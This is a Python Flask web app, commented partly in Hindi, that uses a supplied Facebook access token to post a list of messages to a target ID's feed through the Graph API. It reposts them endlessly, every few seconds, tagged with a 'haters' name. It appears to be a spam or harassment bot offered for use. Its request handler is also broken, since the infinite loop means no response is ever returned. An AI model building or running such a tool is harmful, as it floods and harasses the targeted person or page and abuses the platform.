import os
import time
from flask import Flask, render_template, request, jsonify
import requests
import json

app = Flask(__name__)

# --- Facebook Messaging Logic (Core Project Code) ---
def send_bulk_messages(access_token, target_id, messages_str, delay_time, haters_name, here_name):
    messages = [m.strip() for m in messages_str.split('\n') if m.strip()]
    results = []
    
    try:
        delay_time = int(delay_time)
        if delay_time < 5:
            delay_time = 5 
    except ValueError:
        delay_time = 10
        
    # --- लूपिंग शुरू होती है ---
    while True: 
        results.append("=============================================")
        results.append(f"🟢 STARTING NEW LOOP: Sending messages from start to {target_id}...")
        results.append("=============================================")
        
        for message_content in messages:
            # यहाँ मैसेज को कस्टमाइज़ किया गया है
            final_message = f"{haters_name.strip()} | Roll Number: {message_content} | {here_name.strip()}"
            
            URL = f"https://graph.facebook.com/v15.0/{target_id}/posts"
            
            data = {
                'message': final_message, 
                'access_token': access_token
            }
            
            try:
                response = requests.post(URL, data=data)
                response_data = response.json()
                
                if response.status_code == 200:
                    result = f"✅ SUCCESS! Sent '{message_content}'. Post ID: {response_data.get('id')}"
                else:
                    error_msg = response_data.get('error', {}).get('message', 'Unknown Error')
                    result = f"❌ FAILED! Status: {response.status_code}. Error: {error_msg}"
            
            except requests.exceptions.RequestException as e:
                result = f"❌ CRITICAL NETWORK ERROR: {e}. Pausing for 5 minutes."
                results.append(result)
                time.sleep(300) 
                continue 

            results.append(result)
            time.sleep(delay_time) 
            
        results.append("=============================================")
        results.append("🔄 LOOP COMPLETE. Restarting in 60 seconds...")
        results.append("=============================================")
        time.sleep(60) 

    return results

# --- Website Routes ---
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/send_messages', methods=['POST'])
def send_handler():
    access_token = request.form['token'].strip()
    target_id = request.form['target_id'].strip()
    messages_str = request.form['messages'].strip()
    delay = request.form['delay'].strip()
    haters_name = request.form['haters_name'].strip()
    here_name = request.form['here_name'].strip()
    
    if not access_token or not target_id or not messages_str or not delay:
        return jsonify({"results": ["❌ CRITICAL ERROR: Please fill all fields."]})

    results = send_bulk_messages(access_token, target_id, messages_str, delay, haters_name, here_name) 
    
    return jsonify({"results": results})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

